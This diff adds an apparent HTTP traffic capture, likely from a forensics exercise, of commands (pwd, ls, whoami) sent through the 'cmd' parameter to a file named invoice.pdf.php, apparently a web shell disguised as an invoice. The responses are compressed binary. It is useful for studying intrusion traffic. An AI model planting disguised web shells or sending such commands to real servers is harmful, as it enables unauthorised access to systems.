@@ -1,0 +1,48 @@
+GET /invoices/870128353/invoice.pdf.php?cmd=pwd HTTP/1.1
+Host: 10.87.1.2
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Referer: http://10.87.1.2/invoices/870128353/invoice.pdf.php?cmd=whoami
+Upgrade-Insecure-Requests: 1
+
+
+HTTP/1.1 200 OK
+Date: Sun, 20 Oct 2024 18:57:48 GMT
+Server: Apache/2.4.38 (Debian)
+Vary: Accept-Encoding
+Content-Encoding: gzip
+Content-Length: 183
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+..........]....0.D.|E..`Qb...H...IL....&.6....].x.4..7.L.9..Q.0bAi.....3.....d`Z.T
+.(.c+..v."....q.E...?.kA	......(..&.B7K...[u9c:...Y?%.N...mP.(....a.gX...g.....YzH..p9lS...
+........
+GET /invoices/870128353/invoice.pdf.php?cmd=ls HTTP/1.1
+Host: 10.87.1.2
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Referer: http://10.87.1.2/invoices/870128353/invoice.pdf.php?cmd=pwd
+Upgrade-Insecure-Requests: 1
+
+
+HTTP/1.1 200 OK
+Date: Sun, 20 Oct 2024 18:57:51 GMT
+Server: Apache/2.4.38 (Debian)
+Vary: Accept-Encoding
+Content-Encoding: gzip
+Content-Length: 168
+Keep-Alive: timeout=5, max=99
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+..........]..
+.0...<E.....i.!..S+.I..	4?4I.>..Z.:..=..s.-~..{F...8y.u.Q........%...IM.24.D.u!.........J....D.e.........a..o......+...e-z...
+h.t..4[.....c.V........a....
